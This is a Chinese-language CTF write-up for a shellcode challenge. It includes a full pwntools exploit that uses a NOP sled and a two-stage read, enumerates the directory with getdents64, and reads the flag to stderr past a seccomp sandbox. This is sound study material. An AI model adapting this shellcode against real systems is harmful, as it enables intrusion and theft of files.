# shellcode, but FOP

## 题目简述

程序把 `0x20230000` 映射为 RWX，读取 `0x100` 字节后随机偏移 `0~0xff` 再跳转执行。进入 shellcode 前还安装 seccomp，禁止 `execve` 和 `execveat`，并关闭 `stdout`。容器中的 flag 文件名带随机后缀，因此需要先用 `getdents64` 枚举当前目录，再对名称以 `flag` 开头的文件执行 open-read-write，输出到仍可用的 `stderr`。

## 解题过程

### 1. 用 NOP sled 消除随机入口

反汇编可见，间接调用前执行：

```asm
mov rdx, qword ptr [rbp-8]  ; 0x20230000 + rand()%0x100
xor eax, eax
call rdx
```

因此进入代码时 `rax=0`，`rdx` 保存随机入口地址。第一阶段在前面铺 NOP，并把 9 字节 stub 放在 `0x100` 字节末尾：

```asm
xor rdi, rdi
xor dl, dl
push rdx
pop rsi
syscall
```

随机入口无论落在何处都会沿 NOP 滑到 stub。`xor dl, dl` 清掉地址最低字节，把 `rdx` 从 `0x20230000+offset` 还原为映射基址；随后同时令 `rsi=0x20230000`。结合 `rax=0`、`rdi=0`，该 `syscall` 等价于把第二阶段从标准输入读回映射起点。由于 stub 正好结束于 `base+0x100`，第二次读取完成后会自然继续执行放在该偏移的主 shellcode。

### 2. 枚举随机文件名并 ORW

第二阶段数据以 `".\x00"` 开头，供 `open(".", 0)` 使用；真正代码放在偏移 `0x100`。`linux_dirent64` 的 `d_reclen` 位于偏移 `0x10`，`d_name` 位于偏移 `0x13`，逐项检查名称前四字节是否为 `flag` 即可。

```python
import sys
from pwn import asm, context, process, remote

context(arch="amd64", os="linux")

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process("./ret2shellcode-revenge")

stage0 = asm(r"""
    xor rdi, rdi
    xor dl, dl
    push rdx
    pop rsi
    syscall
""").rjust(0x100, b"\x90")

stage1 = asm(r"""
    /* open(".", O_RDONLY) */
    mov rdi, rsi
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    /* getdents64(dirfd, 0x20230500, 0x300) */
    mov edi, eax
    mov esi, 0x20230500
    mov edx, 0x300
    mov eax, 217
    syscall
    test rax, rax
    jle finish

    mov r12, rsi
    lea r14, [rsi + rax]

next_entry:
    cmp r12, r14
    jae finish
    movzx r13d, word ptr [r12 + 0x10]
    test r13d, r13d
    jz finish
    cmp dword ptr [r12 + 0x13], 0x67616c66
    je found_flag
    add r12, r13
    jmp next_entry

found_flag:
    /* open(d_name, O_RDONLY) */
    lea rdi, [r12 + 0x13]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    /* read(flag_fd, 0x20230900, 0x100) */
    mov edi, eax
    mov esi, 0x20230900
    mov edx, 0x100
    xor eax, eax
    syscall

    /* write(stderr, buffer, bytes_read) */
    mov edx, eax
    mov edi, 2
    mov esi, 0x20230900
    mov eax, 1
    syscall

finish:
    mov eax, 60
    xor edi, edi
    syscall
""")

second_read = b".\x00".ljust(0x100, b"\x90") + stage1

io.sendafter(b"Now show me your code:\n", stage0)
io.send(second_read)
io.interactive()
```

seccomp 只拦截 59 和 322，因此 `open(2)`、`read(0)`、`write(1)`、`getdents64(217)` 与 `exit(60)` 均可使用。输出选择 fd 2，是因为程序在调用 shellcode 前执行了 `close(1)`。

## 方法总结

本题需要同时解决随机入口、禁用 execve、随机文件名和关闭 stdout 四个约束。第一阶段利用调用前寄存器状态做二次读取，第二阶段通过目录枚举定位文件，再使用 ORW 读取；这比假设文件名固定或直接套 `shellcraft.sh()` 更符合实际沙箱边界。
